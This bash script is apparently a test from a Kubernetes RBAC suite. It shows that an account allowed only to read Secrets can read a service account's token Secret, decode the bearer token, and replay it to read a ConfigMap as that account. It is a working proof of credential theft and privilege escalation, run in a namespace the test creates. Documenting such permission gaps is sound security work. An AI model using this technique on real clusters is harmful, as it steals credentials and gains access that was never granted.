#!/usr/bin/env bash
# Identity assumption: get Secret (SA token) -> act as the SA  (read-token-secret-assumes-sa)
#
# Proof: an identity granted ONLY `get secrets` (not `get configmaps`) can read a
# ServiceAccount token Secret, decode the SA's bearer token, and replay it to
# `get configmaps` as that SA -- gaining its permission.
# Mechanism: ../transitions/read-token-secret-assumes-sa.md
source "$(dirname "$0")/../lib.sh"
test_start "read-token-secret-assumes-sa"

ns="$(new_ns tok-sa)"
cm_val="cfg-${RUN_ID}"

# Victim SA that CAN get configmaps, a target ConfigMap, and a token Secret for
# the SA (>=1.24 does not auto-create one, so admin creates it explicitly).
step "admin creates victim-sa, ConfigMap 'target', and a token Secret for the SA"
mk_sa "$ns" victim-sa
grant_ns "$ns" victim-sa "" "configmaps" "get,list"
K -n "$ns" create configmap target --from-literal=key="$cm_val" >/dev/null || fail "could not create configmap"
K -n "$ns" apply -f - >/dev/null <<EOF || fail "could not create token secret"
apiVersion: v1
kind: Secret
metadata:
  name: victim-token
  annotations: { kubernetes.io/service-account.name: victim-sa }
type: kubernetes.io/service-account-token
EOF
# the token controller populates data.token
vtok=""
for i in $(seq 1 30); do
  vtok="$(K -n "$ns" get secret victim-token -o jsonpath='{.data.token}' 2>/dev/null)"
  [ -n "$vtok" ] && break; sleep 1
done
assert_nonempty "$vtok" "token controller populated the SA token Secret"

# Attacker SA: ONLY `get secrets`. NOT get configmaps.
mk_sa "$ns" attacker
grant_ns "$ns" attacker "" "secrets" "get,list"
subj="$(sa_subject "$ns" attacker)"

# THE GAP: holds p (get secrets) but not q (get configmaps).
assert_can    "$subj" get secrets    "$ns"
assert_cannot "$subj" get configmaps "$ns"

# ACT (as attacker, exercising ONLY p): read the token Secret, decode the SA token.
atok="$(K -n "$ns" create token attacker)"
raw="$(ktoken "$atok" -n "$ns" get secret victim-token -o jsonpath='{.data.token}' 2>/dev/null)"
assert_nonempty "$raw" "attacker read the SA token Secret with 'get secrets'"
stolen="$(printf '%s' "$raw" | base64 -d 2>/dev/null)"

# EFFECT: replay the SA's bearer token to read the ConfigMap as victim-sa.
step "attacker replays victim-sa's token to get ConfigMap 'target'"
got="$(ktoken "$stolen" -n "$ns" get configmap target -o jsonpath='{.data.key}' 2>/dev/null)"
assert_eq "$got" "$cm_val" "attacker read the ConfigMap by replaying the SA's token from the Secret"

test_pass
